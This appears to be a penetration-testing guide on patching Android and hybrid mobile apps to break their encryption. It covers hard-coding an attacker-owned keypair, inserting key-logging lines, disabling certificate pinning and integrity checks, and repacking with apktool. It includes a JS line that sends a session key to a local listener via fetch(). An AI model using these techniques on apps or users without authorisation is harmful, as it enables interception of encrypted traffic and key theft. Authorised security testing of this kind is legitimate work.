# Patch the client instead of hooking it

Editing the app is usually **less work and far more robust** than instrumenting it: the change survives
reboots and re-launches, needs no agent running, can't be detected by frida/root checks, and works on a
device that will never run `frida-server`. Prefer it over hooking whenever the app is repackable.

Three things worth patching, in order of value:

## 1. Replace a generated keypair with one you own

The strongest move against a per-session key exchange
(mint the pair with `crypto-cli.py keygen --alg rsa|x25519|p256 --out keys/mine.pem`). If the client generates its keypair at runtime
and the server encrypts the session key to it, hard-code **your** keypair in its place. From then on you
can decrypt the key blob out of any capture — offline, later, without touching the proxy or the device.

- **Hybrid / WebView apps (Angular/React/Cordova/Capacitor):** the crypto is plain JS in
  `assets/www/**.js`. Find where the pair is created or stored (`generateKeyPair(...)`, `crypto.subtle.generateKey(...)`,
  `setPrivateKey(...)`, `x25519.generateKeyPair()`, or a `keys.private = atob(<literal>)` assignment)
  and replace it with a literal pair you own. This is a text edit — no smali, no
  recompilation of code, and the same file tells you the mode, IV handling and wrappers.
- **Native Android:** patch the smali where the key/keypair is built, or make the getter return your
  constant. Heavier, but the same idea.

## 2. Make the app log what you can't otherwise see

A one-line insertion beats a whole instrumentation stack: write the key (or the plaintext) to a file or
to logcat right where it is used.

- JS: `console.log('KEY', key)` / `fetch('http://10.0.2.2:9999/?k='+key)` — reachable from `adb logcat`
  or your own listener.
- smali: an `android.util.Log` call, or a `java.io.FileWriter` into the app's own data dir.

Pair it with a key log (`<ts>: <key> <session>`) and `crypto-cli.py --key-log` reads it directly.

## 3. Defeat what blocks you (pinning, key pinning, integrity checks)

Same mechanics: edit the pinned key/hash, drop the check, or flip the config flag. When an app verifies
its own signature, patching is what breaks — that's when the proxy-side route (`key-exchange-mitm.md`)
or, last, runtime hooking, is the answer.

## Repack recipe (Android)

```bash
apktool d app.apk -o work/                        # decode
# ... edit work/assets/www/**.js  or  work/smali*/**.smali ...
apktool b work/ -o patched.apk                    # rebuild
zipalign -p -f 4 patched.apk aligned.apk
apksigner sign --ks my.keystore --out final.apk aligned.apk
adb install -r final.apk                          # uninstall first if the signature differs
```

**Split APKs (most modern apps):** you must reinstall *all* splits together, signed with the same key —
`adb install-multiple base.apk split_config.*.apk`, or use a split installer app (SAI) with an updated
manifest (if it records per-file sizes, fix them). Patch only `base.apk` unless the code you need lives
in a split.

Notes that save a wasted afternoon:
- A resigned app has a different signature: data is wiped on reinstall, and any server-side app-integrity
  check (Play Integrity, SafetyNet, a custom checksum) may now fail. Test the login flow *immediately*
  after installing, before doing any crypto work.
- Keep the original artifact and reinstall the clean build at the end of the engagement.
- If the app is a hybrid whose web assets are downloaded/updated at runtime, the shipped bundle may be
  replaced on first launch — check for an OTA/CodePush mechanism, and either block it or patch the
  downloaded copy in the proxy instead.

## Cheaper client-side options before repacking

- **Debuggable build** (`android:debuggable="true"` in the manifest, or a debug variant): `run-as` gives
  you the app's private files, and a Java debugger can read the key at a breakpoint — no repack.
- **WebView debugging:** if the app enables it (or you flip that one flag), `chrome://inspect` gives you
  a console inside the app's own page. You can read the key, call the app's crypto functions directly,
  and encrypt/decrypt with the app's own code — often the fastest path for a hybrid app.
- **`adb logcat` while driving a fresh login** — apps log keys more often than you would expect.
- **The app's own local storage** (`shared_prefs`, WebView `localStorage`, sqlite): a cached session key
  is sometimes just sitting there.
